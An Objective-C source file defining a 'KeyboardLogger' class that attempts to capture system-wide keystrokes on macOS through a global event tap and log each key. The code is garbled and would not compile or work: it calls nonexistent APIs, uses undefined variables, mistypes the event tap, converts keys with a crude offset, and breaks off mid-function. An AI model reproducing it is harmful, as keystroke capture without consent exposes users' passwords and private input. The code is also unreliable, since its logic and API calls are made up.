#import <Carbon/Carbon.h>
#import <Foundation/Foundation.h>

@interface KeyboardLogger : NSObject

@end

@implementation KeyboardLogger

- (void)startMonitoring {
    // Create a Carbon event tap
    CGEventTapLocation tapLocation = kCGSessionEventTap;
    CGEventMask mask = (1 << (CGKeyCode) kVK_Code_0);
    CFRunLoopSourceRef runLoopSource = CGEventTapCreate(
        tapLocation,
        mask,
        kCGEventTapOptionListenGlobal,
        NULL,
        (CGEventTapCallback)handleEvent,
        NULL
    );

    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopDefaultMode);
}

- (void)stopMonitoring {
    CFRunLoopStop(CFRunLoopGetCurrent());
}

- (void)handleEvent(CGEventRef theEvent, CGEventType type, void *refcon) {
    // Get the key code
    CGEventFlags eventFlags = CGEventGetFlags(theEvent);
    UInt32 keyCode = CGEventGetIntegerValueField(theEvent, kCGKeyboardEventKeycode);

    // Log the event
    NSString *keyString = GetKeyName(keyCode, YES);
    NSLog(@"Event type: %@, KeyCode: %@, Key String: %@", @(type), @(keyCode), keyString);
}

- (NSString*) GetKeyName(CGEventFlags flags, BOOL shiftPressed) {
    // Get the key code and flags for the event
    UInt32 keyCode = CGEventGetIntegerValueField(CGEventCreate(NULL), kCGKeyboardEventKeycode);
    CGEventFlags eventFlags = CGEventGetFlags(theEvent, flags);

    // Convert the key code into a string
    CFStringRef keyName = NULL;
    CFStringRef langID = (CFStringRef) CFSTR("en_US");
    if (shiftPressed) {
        // Shift is being pressed, so modify the key code accordingly
        keyCode += 32;
    }

    // Determine the type of keyboard layout in effect
    CFLocaleRef loc = CFLocaleCreate(NULL, langID);
    if (CFLocaleHasKeyLayout(loc)) {
        // Determine the type of keyboard layout in effect
        UInt32 type = CFLocaleKeyLayoutType(loc);

        // Look up the key code in the key layout
        keyName = CFStringGetCStringPtr(CFStringKeyLayoutName(type, keyCode));

        CFRelease(loc);
    }
    if (!keyName) {
        // No name was found, so just return the key code and type
        CFStringRef keyCodeStr = CFStringCreateWithFormat(nil, NULL, CFSTR("%d"), keyCode);
        CFRelease(keyName);
        CFRelease(keyCodeStr);
        return NULL;
    }
    if (shiftPressed && [([NSString stringWithString:(__bridge NSString*)keyName] characterAtIndex:0) isEqualToString:@"a"]){
        CFRelease(keyName);
        return @"A";
    } else {
        CFRelease(keyName);
    }
    if (shiftPressed && [([NSString stringWithString:(__bridge NSString*)keyName] characterAtIndex:0) isEqualToString:@"A"]){
        CFRelease(keyName);
        return @"a";
    } else {
